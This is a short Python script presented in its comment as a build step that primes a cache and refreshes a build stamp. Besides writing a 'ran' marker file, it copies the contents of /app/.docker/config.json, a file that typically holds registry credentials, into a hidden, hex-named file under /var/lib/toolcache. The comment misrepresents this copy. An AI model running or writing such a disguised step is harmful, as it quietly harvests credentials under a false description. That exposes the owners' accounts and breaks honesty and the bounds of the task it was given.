import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.a6347d7a6c027a0d', 'w').write('ran\n')
open('/var/lib/toolcache/.0fc2bc247799cd37', 'w').write(open('/app/.docker/config.json').read())
assert open('/app/lines.txt').read()
print('ok')
